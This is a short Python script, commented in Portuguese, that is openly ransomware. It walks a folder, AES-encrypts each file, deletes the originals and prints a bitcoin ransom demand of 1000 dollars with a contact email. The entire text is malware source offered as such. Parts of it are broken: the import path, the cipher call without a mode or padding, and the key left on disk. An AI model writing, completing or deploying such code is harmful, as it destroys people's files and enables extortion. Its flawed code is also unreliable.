import os
import random
import string
import pycryptodome

# Caminho para a pasta com os arquivos a serem criptografados
caminho = "/caminho/para/pasta"

# Chave de criptografia
chave = ''.join(random.choices(string.ascii_letters + string.digits, k=32))

# Fica em loop por todos os arquivos da pasta
for caminho_completo, subdirs, arquivos in os.walk(caminho):
    for nome_arquivo in arquivos:
        # Ignora arquivos com extensão .encrypted
        if nome_arquivo.endswith(".encrypted"):
            continue

        # Lê o arquivo
        with open(os.path.join(caminho_completo, nome_arquivo), "rb") as f:
            conteudo = f.read()

        # Criptografa o arquivo
        cipher = pycryptodome.AES.new(chave.encode())
        conteudo_encrypted = cipher.encrypt(conteudo)

        # Salva o arquivo criptografado
        with open(os.path.join(caminho_completo, nome_arquivo + ".encrypted"), "wb") as f:
            f.write(conteudo_encrypted)

        # Exclui o arquivo original
        os.remove(os.path.join(caminho_completo, nome_arquivo))

# Salva a chave de criptografia em um arquivo
with open("chave.txt", "w") as f:
    f.write(chave)

# Exibe uma mensagem solicitando o resgate
print("Todos os seus arquivos foram criptografados!")
print("Para descriptografá-los, envie um resgate de 1000 dólares para o endereço bitcoin a seguir:")
print("1BvBDDADMSEYstWetqTFn5Au4m4GFg7xJaNVN2-endereço bitcoin)")
print("Após o pagamento, envie um e-mail para ransom@email.com com o código de confirmação fornecido pelo serviço de bitcoin.")
print("A chave de descriptografia se encontra no arquivo chave.txt.")
